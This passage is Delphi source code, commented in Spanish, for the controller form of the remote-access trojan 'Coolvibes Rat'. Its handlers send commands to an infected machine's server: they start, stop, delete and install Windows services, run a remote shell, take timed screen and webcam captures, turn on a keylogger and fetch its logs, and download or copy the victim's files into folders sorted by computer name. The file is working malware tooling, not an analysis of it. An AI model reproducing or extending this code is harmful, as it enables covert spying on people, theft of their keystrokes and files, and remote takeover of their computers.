        'Se escogió el mismo color para la fuente y el fondo. Escoge otro.',
        'Advertencia', 0 + MB_IconWarning);
  end;
end;

procedure TFormControl.PopupShellPopup(Sender: TObject);
begin
  Activar2.Enabled    := not ComboBoxShellCommand.Enabled;
  Desactivar2.Enabled := ComboBoxShellCommand.Enabled;
end;

procedure TFormControl.Desactivar2Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('SHELL|DESACTIVAR')
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;


procedure TFormControl.Guardarcmo1Click(Sender: TObject);
begin
  DlgGuardar.Title      := 'Guardar texto :: Coolvibes ::';
  DlgGuardar.InitialDir := GetCurrentDir();
  DlgGuardar.Filter     := 'Archivo de texto (*.txt)|*.txt';
  DlgGuardar.DefaultExt := 'txt';
  if DlgGuardar.Execute then
  begin
    MemoShell.Lines.SaveToFile(DlgGuardar.FileName);
    StatusBar.Panels[1].Text := 'Archivo guardado como: ' + DlgGuardar.FileName;
  end;
end;

procedure TFormControl.BtnServiciosClick(Sender: TObject);
begin
  BtnServicios.enabled := false;
  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    exit;
  end;
  ListViewServicios.Clear;
  Servidor.Connection.Writeln('LISTARSERVICIOS');
end;

procedure TFormControl.DEtener1Click(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    exit;
  end;
  Servidor.Connection.Writeln('DETENERSERVICIO' + ListViewServicios.Selected.Caption);
end;

procedure TFormControl.Iniciar1Click(Sender: TObject);
begin

  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    exit;
  end;

   mslistviewitem := ListViewServicios.Selected;
   while Assigned(mslistviewitem) do
   begin
      Servidor.Connection.Writeln('INICIARSERVICIO' + mslistviewitem.Caption);
      mslistviewitem := ListViewServicios.GetNextItem(mslistviewitem, sdAll, [isSelected]);
   end;
end;

procedure TFormControl.Desinstalar1Click(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    exit;
  end;
  
  mslistviewitem := ListViewServicios.Selected;
   while Assigned(mslistviewitem) do
   begin
      Servidor.Connection.Writeln('BORRARSERVICIO' + mslistviewitem.Caption);
      mslistviewitem := ListViewServicios.GetNextItem(mslistviewitem, sdAll, [isSelected]);
   end;
end;

procedure TFormControl.Instalar1Click(Sender: TObject);
begin
  btnSiguienteInstalarServicio.Visible := True;
  BtnCancelarInstalarServicio.Visible := True;
  MultiEditInstalarServicio.Visible := True;
  MultiEditInstalarServicio.Text := '{Escribir el nombre del servicio}';
end;

procedure TFormControl.BtnCancelarInstalarServicioClick(Sender: TObject);
begin
  btnSiguienteInstalarServicio.Visible := False;
  BtnCancelarInstalarServicio.Visible := False;
  MultiEditInstalarServicio.Visible := False;
  btnInstServicios.Visible  := False;
  btnInstServicios2.Visible := False;
end;

procedure TFormControl.btnSiguienteInstalarServicioClick(Sender: TObject);
begin
  NombreSI := MultiEditInstalarServicio.Text;
  MultiEditInstalarServicio.Text := '{Escribir la descripción del servicio}';
  btnSiguienteInstalarServicio.Visible := False;
  btnInstServicios.Visible := True;
end;

procedure TFormControl.btnInstServiciosClick(Sender: TObject);
begin
  descripcionSI := MultiEditInstalarServicio.Text;
  MultiEditInstalarServicio.Text := '{Ruta del ejecutable a poner de servicio}';
  btnInstServicios.Visible := False;
  btnInstServicios2.Visible := True;
end;

procedure TFormControl.btnInstServicios2Click(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    exit;
  end;
  RutaSI := MultiEditInstalarServicio.Text;
  Servidor.Connection.Writeln('INSTALARSERVICIO' + nombresi + '|' +
    descripcionSI + '|' + rutaSi + '|');
  btnSiguienteInstalarServicio.Visible := False;
  BtnCancelarInstalarServicio.Visible := False;
  MultiEditInstalarServicio.Visible := False;
  btnInstServicios.Visible  := False;
  btnInstServicios2.Visible := False;
end;

procedure TFormControl.PopupDescargasPopup(Sender: TObject);
var
  Descarga: TDescargaHandler;
begin
  if ListViewDescargas.Selected = nil then
    Exit;
  Descarga := TDescargaHandler(ListViewDescargas.Selected.Data);
  if not Descarga.Transfering then
    PopUpDescargas.Items[0].Enabled := False; //menu Detener descarga
  if Descarga.cancelado then
    PopUpDescargas.Items[1].Enabled := True;
end;

procedure TFormControl.DetenerDescarga1Click(Sender: TObject);
var
  Descarga: TDescargaHandler;
begin
   mslistviewitem := ListViewDescargas.Selected;
   if mslistviewitem = nil then
    Exit;

   while Assigned(mslistviewitem) do
   begin
        Descarga := TDescargaHandler(mslistviewitem.Data);
        Descarga.CancelarDescarga;
      mslistviewitem := ListViewDescargas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
   end;

end;

procedure TFormControl.ReanudarDescarga1Click(Sender: TObject);
var
  Descarga: TDescargaHandler;
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    exit;
  end;

  mslistviewitem := ListViewDescargas.Selected;
   if mslistviewitem = nil then
    Exit;

   while Assigned(mslistviewitem) do
   begin
        Descarga := TDescargaHandler(mslistviewitem.Data);
        Servidor.Connection.Writeln('RESUMETRANSFER|' + Descarga.Origen +
    '|' + IntToStr(Descarga.Descargado));
      mslistviewitem := ListViewDescargas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
   end;


end;

procedure TFormControl.Agregaracoladedescarga1Click(Sender: TObject);
var
  Descarga: TDescargaHandler;
  FilePath: ansistring;
  Size:     integer;
begin
 mslistviewitem := ListViewArchivos.Selected;
   if mslistviewitem = nil then
    Exit;
   CrearDirectoriosUsuario();
   while Assigned(mslistviewitem) do
   begin
      FilePath := EditPathArchivos.Text + mslistviewitem.Caption;
      Size     := StrToInt(mslistviewitem.SubItems.Strings[3]);
      Descarga := TDescargaHandler.Create(nil, FilePath, Size,
      ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\' +
      ExtractFileName(FilePath), ListViewDescargas, True);
      Descarga.callback := Self.TransferFinishedNotification;
      mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
   end;
end;

procedure TFormControl.EditPathArchivosKeyPress(Sender: TObject; var Key: char);
begin
  if (key = #13) then
  begin
    EditPathArchivos.Text := Trim(EditPathArchivos.Text);
    Self.BtnActualizarArchivos.Click;
  end;
end;

//El evento OnClick es igual para todos los listviews
procedure TFormControl.ListViewProcesosColumnClick(Sender: TObject;
  Column: TListColumn);
begin
  Columna := Column.Index;
  (Sender as TListView).AlphaSort;
  if Columna <> ColumnaOrdenada then   //Para acordarnos por que columna está ordenado
    ColumnaOrdenada := Columna
  else
    ColumnaOrdenada := -1;
end;

//Este evento lo comparten varios ListViews, aquellos que en la columna 0 y 2 sean cadenas y la 1 sea un numero
procedure TFormControl.ListViewProcesosCompare(Sender: TObject;
  Item1, Item2: TListItem; Data: integer; var Compare: integer);
var
  Str1, Str2: string;
begin
  if Columna = 0 then  //Si Columna = 0 usar Item.Caption
  begin
    Str1 := Item1.Caption;
    Str2 := Item2.Caption;
  end
  else
  begin       //Si Columna > 0 usar Item.SubItems[Columna -1]
    if Item1.SubItems.Count < Columna then
      Str1 := ''
    else
      Str1 := Item1.SubItems[Columna - 1];
    if Item2.SubItems.Count < Columna then
      Str2 := ''
    else
      Str2 := Item2.SubItems[Columna - 1];
  end;
  if Columna in [0, 2] then  //Son tratadas como cadenas
    Compare := CompareText(Str1, Str2)
  else  //Columna 1, PID
    Compare := StrToIntDef(Str1, 0) - StrToIntDef(Str2, 0);
  //Si la columna ya fue ordenada anteriormente, invertir el orden
  if Columna = ColumnaOrdenada then
    Compare := Compare * -1; //Invertimos el resultado
  (Sender as TListView).SetFocus;
end;

//Para el registro y los servicios las 3 columnas son cadenas
procedure TFormControl.ListViewRegistroCompare(Sender: TObject;
  Item1, Item2: TListItem; Data: integer; var Compare: integer);
var
  Str1, Str2: string;
begin
  if Columna = 0 then  //Si Columna = 0 usar Item.Caption
  begin
    Str1 := Item1.Caption;
    Str2 := Item2.Caption;
  end
  else
  begin       //Si Columna > 0 usar Item.SubItems[Columna -1]
    if Item1.SubItems.Count < Columna then
      Str1 := ''
    else
      Str1 := Item1.SubItems[Columna - 1];
    if Item2.SubItems.Count < Columna then
      Str2 := ''
    else
      Str2 := Item2.SubItems[Columna - 1];
  end;
  Compare := CompareText(Str1, Str2);
  if Columna = ColumnaOrdenada then
    Compare := Compare * -1;
end;

//Para ordenar ficheros
procedure TFormControl.ListViewArchivosCompare(Sender: TObject;
  Item1, Item2: TListItem; Data: integer; var Compare: integer);
var
  Str1, Str2: string;
begin
  if Columna = 0 then  //Si Columna = 0 usar Item.Caption
  begin
    Str1 := Item1.Caption;
    Str2 := Item2.Caption;
  end
  else
  begin       //Si Columna > 0 usar Item.SubItems[Columna -1]
    if Item1.SubItems.Count < Columna then
      Str1 := ''
    else
      Str1 := Item1.SubItems[Columna - 1];
    if Item2.SubItems.Count < Columna then
      Str2 := ''
    else
      Str2 := Item2.SubItems[Columna - 1];
  end;

  if Item1.Caption = '<..>' then  //Siempre arriba
  begin
    Compare := Low(integer);  //El minimo valor posible de un Integer
    exit;
  end;
  case Columna of
    0:
    begin
      Compare := CompareText(Str1, Str2);
    end;
    1: Compare := ObtenerMejorUnidadInv(Str1) - ObtenerMejorUnidadInv(Str2);
    2: Compare := CompareText(Str1, Str2);
    3: Compare := Round(StrToDateTime(Str1) - StrToDateTime(Str2));
  end;
  if Columna = ColumnaOrdenada then
    Compare := Compare * -1;
end;

procedure TFormControl.Iralproceso1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
  begin
    if ListViewVentanas.Selected = nil then
      MessageDlg('Selecciona alguna ventana', mtWarning, [mbOK], 0)
    else                         //Recibe el PID de la ventana con Handle
      Servidor.Connection.Writeln('WINPROC|' + ListViewVentanas.Selected.SubItems[0]);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.SpinCaptureScreenChange(Sender: TObject);
begin
  try
    if SpinCaptureScreen.Value < 0 then
      SpinCaptureScreen.Value := 0;
    if SpinCaptureScreen.Value > 30 then
      SpinCaptureScreen.Value := 30;
      TimerCaptureScreen.Interval := SpinCaptureScreen.Value*1000+250;
  except
  end;
end;



procedure TFormControl.CheckBoxAutoCapturaScreenClick(Sender: TObject);
begin
  if Self.CheckBoxAutoCapturaScreen.Checked then
  begin
    BtnCapturarScreen.click; //Hacemos la primera captura
  end;

  TimerCaptureScreen.Interval := SpinCaptureScreen.Value*1000+250;
  TimerCaptureScreen.Enabled  := CheckBoxAutoCapturaScreen.Checked;
end;



procedure TFormControl.Previsualizarjpg1Click(Sender: TObject);
var
  i: integer;
  Descarga: TDescargaHandler;
  FilePath: ansistring;
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    exit;
  end;
  //nos aseguramos de que el archivo no este en la lista de
  //descargas (sin importar si esta transfiriendo o si ya finalizo)

  mslistviewitem := ListViewArchivos.Selected;
  while Assigned(mslistviewitem) do
  begin
    if (FormVisorDeMiniaturas = nil) then
      FormVisorDeMiniaturas := Tobject(TFormVisorDeMiniaturas.create(self,servidor,self));
    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).show;

    FilePath := Trim(EditPathArchivos.Text) + Trim(mslistviewitem.Caption);
    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).aniadirthumbnail(Filepath);
    mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
  end;
end;

procedure TFormControl.SpinCamChange(Sender: TObject);
begin
  try
    if SpinCam.Value < 0 then
      SpinCam.Value := 0;
    if SpinCam.Value > 30 then
      SpinCam.Value := 30;
      TimerCamCapture.Interval := SpinCam.Value*1000+250;
  except
  end;
end;

procedure TFormControl.CheckBoxAutoCamCaptureClick(Sender: TObject);
begin
  if Self.CheckBoxAutoCamCapture.Checked then
  begin
    BtnCapturarWebcam.Click; //Hacemos la primera captura
  end;

  TimerCamCapture.Interval := SpinCam.Value*1000+250;
  TimerCamCapture.Enabled  := CheckBoxAutoCamCapture.Checked;
end;

procedure TFormControl.TimerCamCaptureTimer(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
  begin
    self.TimerCamCapture.Enabled := False;
    exit;
  end;
  PedirJPG(1,'');
end;

procedure TFormControl.CheckBoxMostrarVentanasOcultasClick(
  Sender: TObject);
begin
  if(BtnRefrescarVentanas.enabled) then
  BtnRefrescarVentanas.click;
end;

procedure TFormControl.agregardescarga(filename:string);
var
  i: integer;
  Descarga: TDescargaHandler;
begin
  //nos aseguramos de que el archivo no este en la lista de
  //descargas (sin importar si esta transfiriendo o si ya finalizo)
    for i := 0 to ListViewDescargas.Items.Count - 1 do
    begin
      Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
      if Descarga.Origen = Filename then exit;
    end;
    Servidor.Connection.Writeln('GETFILE|' + filename);
end;

procedure TFormControl.agregardescargaencola(filename:string;tamano:integer);
var
  i: integer;
  Descarga,Descarga2: TDescargaHandler;
begin
  //nos aseguramos de que el archivo no este en la lista de
  //descargas (sin importar si esta transfiriendo o si ya finalizo)
 
    for i := 0 to ListViewDescargas.Items.Count - 1 do
    begin
      Descarga2 := TDescargaHandler(ListViewDescargas.Items[i].Data);
      if Descarga2.Origen = Filename then exit;
    end;
      CrearDirectoriosUsuario();
      Descarga := TDescargaHandler.Create(nil, FileName, Tamano,
      ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\' +
      ExtractFileName(FileName), ListViewDescargas, True);
      Descarga.callback := TransferFinishedNotification;

end;


procedure TFormControl.CrearDirectoriosUsuario();
begin
if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\')) then
CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\');

if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\')) then
CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\');

if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Capturas\')) then
CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Capturas\');

if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Webcam\')) then
CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Webcam\');

if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Thumbnails\')) then
CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Thumbnails\');

if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\')) then
CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\');
end;

procedure TFormControl.pedirJPG(tipo:integer;info:string);//0=pantalla 1=webcam 2=thumnails info=thumbnailpath
var
PantallaAutomatico : boolean;
WebcamAutomatico : boolean;
begin //La funcion que pide las capturas de webcam, de pantalla y los thumbnails
  if (RecibiendoJPG) then exit; //Se piden por aqui para en el futuro crear un sistema por turnos
  RecibiendoJPG := true;
  
  if(tipo = 0) then       //CAPSCREEN
  begin
    Servidor.Connection.Writeln('CAPSCREEN' + IntToStr(TrackBarCalidad.Position)+'|'+inttostr(imgCaptura.Height)+'|');
  end
  else if (tipo = 1) then //CAPTURAWEBCAM
  begin
    Servidor.Connection.Writeln('CAPTURAWEBCAM' + IntToStr(ComboboxWebcam.ItemIndex) +
    '|' + IntToStr(TrackBarCalidadWebcam.Position));
  end
  else if (tipo = 2) then //thumbnails
  begin
    Servidor.Connection.Writeln(info);
  end
  else if(tipo = 3)  then //RECIBIRKEYLOGGER
  begin
    Servidor.Connection.Writeln('RECIBIRKEYLOGGER');
  end;
end;
 

procedure TFormControl.Guardarimagen1Click(Sender: TObject);
begin
  DlgGuardar.Title      := 'Guardar imagen ::Coolvibes Rat::';
  DlgGuardar.InitialDir := GetCurrentDir();
  DlgGuardar.Filter     := 'Imagen .Jpeg|*.jpg';
  DlgGuardar.DefaultExt := 'jpg';
  if DlgGuardar.Execute then
  begin
    if Pagecontrol.activepage = TabScreenCap then
      //Se está guardando una captura
      imgCaptura.Picture.SaveToFile(DlgGuardar.FileName)
    else  //Sino es una webcam
      imgWebcam.Picture.SaveToFile(DlgGuardar.FileName);
      StatusBar.Panels[1].Text := 'Imagen guardada como: ' + DlgGuardar.FileName;
  end;
end;

procedure TFormControl.btnGuardarImagenClick(Sender: TObject);
var
  popupPoint : TPoint;
begin
  popupPoint.X := TSpeedButton(Sender).left;
  popupPoint.Y := TSpeedButton(Sender).top;
  popupPoint := ClientToScreen(popupPoint) ;

  PopupGuardarPantallaoWebcam.popup(popupPoint.X, popupPoint.Y) ;

end;

procedure TFormControl.PopupGuardarPantallaoWebcamPopup(Sender: TObject);
begin
  if PageControl.activepage = TabScreencap then
  begin
    PopupGuardarPantallaoWebcam.items[0].caption := 'Guardar captura de pantalla';
    if(PrefijoGuardarCaptura = '') then
    begin
      PopupGuardarPantallaoWebcam.items[1].caption := 'Activar guardado automático';
      PopupGuardarPantallaoWebcam.items[1].checked := false;
    end
    else
    begin
      PopupGuardarPantallaoWebcam.items[1].caption := 'Desactivar guardado automático';
      PopupGuardarPantallaoWebcam.items[1].checked := true;
    end;
  end
  else
  begin
    PopupGuardarPantallaoWebcam.items[0].caption := 'Guardar captura de webcam';
    if(PrefijoGuardarWebcam = '') then
    begin
      PopupGuardarPantallaoWebcam.items[1].caption := 'Activar guardado automático';
      PopupGuardarPantallaoWebcam.items[1].checked := false;
    end
    else
    begin
      PopupGuardarPantallaoWebcam.items[1].caption := 'Desactivar guardado automático';
      PopupGuardarPantallaoWebcam.items[1].checked := true;
    end;
  end;
end;

procedure TFormControl.Guardadoautomtico1Click(Sender: TObject);
begin
if((PrefijoGuardarCaptura = '') and (PageControl.activepage = TabScreencap)) then
    PrefijoGuardarCaptura := InputBox('Prefijo captura','Prefijo captura', 'captura_')
else
if((PrefijoGuardarWebcam = '') and (PageControl.activepage = TabWebcam)) then
    PrefijoGuardarWebcam := InputBox('Prefijo captura','Prefijo captura', 'webcam_')
else
if((PrefijoGuardarCaptura <> '') and (PageControl.activepage = TabScreencap)) then
    PrefijoGuardarCaptura := ''
else
if((PrefijoGuardarWebcam <> '') and (PageControl.activepage = TabWebcam)) then
    PrefijoGuardarWebcam := '';
end;

procedure TFormControl.TabKeyloggerShow(Sender: TObject);
begin
  if(not ProgressBarKeylogger.enabled) then  //al mostrarnos por primera vez
  begin
    SpeedButtonRecibirLog.enabled := false;
    EditLogName.enabled := false;
    SpeedButtonGuardarLog.enabled := false;
    SpeedButtonActivarKeylogger.enabled := false;
    SpeedButtonEliminarLog.enabled := false;
    Servidor.Connection.Writeln('ESTADOKEYLOGGER'); //Nada mas mostrarnos obtenemos el estado del keylogger
  end;
end;

procedure TFormControl.SpeedButtonRecibirLogClick(Sender: TObject);
begin
  if not Servidor.Connection.Connected then exit;
  SpeedButtonRecibirLog.enabled := false; //Por estetica
  pedirJPG(3,''); //No es un jpeg pero bueno......
end;

procedure TFormControl.SpeedButtonActivarKeyloggerClick(Sender: TObject);
begin
  SpeedButtonActivarKeylogger.enabled := false;
  if(SpeedButtonActivarKeylogger.caption = 'Activar Keylogger') then
  begin
    if(EditLogName.text <> '') then
      Servidor.Connection.WriteLn('ACTIVARKEYLOGGER|'+EditLogName.text+'|')
    else
      SpeedButtonActivarKeylogger.enabled := true;
  end
  else
    Servidor.Connection.WriteLn('DESACTIVARKEYLOGGER|');

end;

procedure TFormControl.SpeedButtonEliminarLogClick(Sender: TObject);
begin
 Servidor.Connection.Writeln('ELIMINARLOGKEYLOGGER');
end;

procedure TFormControl.CheckBoxOnlineKeyloggerClick(Sender: TObject);
function BooleanToStr(Bool: boolean; TrueString, FalseString: string): string;
begin
  if Bool then
    Result := TrueString
  else
    Result := FalseString;
end;
begin
  if not Servidor.Connection.Connected then exit;
  Servidor.Connection.WriteLn('ONLINEKEYLOGGER|'+BooleanToStr(CheckBoxOnlineKeylogger.checked,'ACTIVAR','DESACTIVAR')+'|');
end;

procedure TFormControl.SpeedButtonGuardarLogClick(Sender: TObject);
begin
  DlgGuardar.Title      := 'Guardar Log de Keylogger ::Coolvibes Rat::';
  DlgGuardar.InitialDir := GetCurrentDir();
  DlgGuardar.Filter     := 'Texto .txt';
  DlgGuardar.DefaultExt := 'txt';
  if DlgGuardar.Execute then
  begin 
    RichEditKeylogger.plaintext := true; //Se guarda como archivo de texto plano
    RichEditKeylogger.lines.savetofile(DlgGuardar.FileName);

    StatusBar.Panels[1].Text := 'Log guardado como: ' + DlgGuardar.FileName;
  end;
end;

procedure TFormControl.TabServidorShow(Sender: TObject);
begin
  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
    BtnActualizarServidorInfo.click;
end;

procedure TFormControl.TabInfoShow(Sender: TObject);
begin
  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
   BtnRefrescarInformacion.click;
end;

procedure TFormControl.TabProcesosShow(Sender: TObject);
begin
  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
   BtnRefrescarProcesos.click;
end;

procedure TFormControl.TabVentanasShow(Sender: TObject);
begin
  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
   BtnRefrescarVentanas.click;
end;

procedure TFormControl.TabServiciosShow(Sender: TObject);
begin
  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
   BtnServicios.click;
end;

procedure TFormControl.TabFileManagerShow(Sender: TObject);
begin
  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
   BtnVerunidades.click;
end;

procedure TFormControl.TabScreencapShow(Sender: TObject);
begin
  Servidor.Connection.Writeln('DATOSCAPSCREEN');
  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
  begin
    BtnCapturarScreen.click;
  end;
end;

procedure TFormControl.TabWebcamShow(Sender: TObject);
begin
  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
    BtnObtenerWebcams.click;
end;

procedure TFormControl.FormCanResize(Sender: TObject; var NewWidth,
  NewHeight: Integer; var Resize: Boolean);
var
  p, p2 : integer;
begin
 
end;

procedure TFormControl.CheckBoxTamanioRealClick(Sender: TObject);
begin
  if CheckBoxTamanioReal.checked then
  begin
    imgCaptura.align := alnone;
    imgCaptura.height := alturapantalla; //La anchura se calcula sola al recibir la captura
  end
  else
  begin
    imgcaptura.align := alLeft;
  end;
  BtnCapturarScreen.click;
end;

procedure TFormControl.PrevisualizarImagenes1Click(Sender: TObject);
begin
  PrevisualizarImagenes1.checked := not PrevisualizarImagenes1.checked;
  PrevisualizacionActiva := PrevisualizarImagenes1.checked;

  if PrevisualizacionActiva then //Iconos grandes
  begin
    Listviewarchivos.viewstyle := vsIcon;
  end
  else
  begin
    Listviewarchivos.viewstyle := vsReport;
  end;
end;

procedure TFormControl.Copiar1Click(Sender: TObject);
begin

  if Servidor.Connection.Connected then
  begin
    mslistviewitem := ListViewArchivos.Selected;
    while Assigned(mslistviewitem) do
    begin
    PortaPapeles := Portapapeles+EditPathArchivos.text+mslistviewitem.caption+'|';
    mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);

end;

procedure TFormControl.Pegar1Click(Sender: TObject);
var
  tmp : string;
begin
  while pos('|',portapapeles) > 0 do
  begin
    tmp := Copy(portapapeles, 1, Pos('|', portapapeles) - 1);
    Delete(portapapeles, 1, Pos('|', portapapeles));
    Servidor.Connection.Writeln('COPYF|'+tmp+'|'+EditPathArchivos.Text +extractfilename(tmp)+'|');
  end;
  btnactualizararchivos.Click;
end;


end.//Fin del proyecto
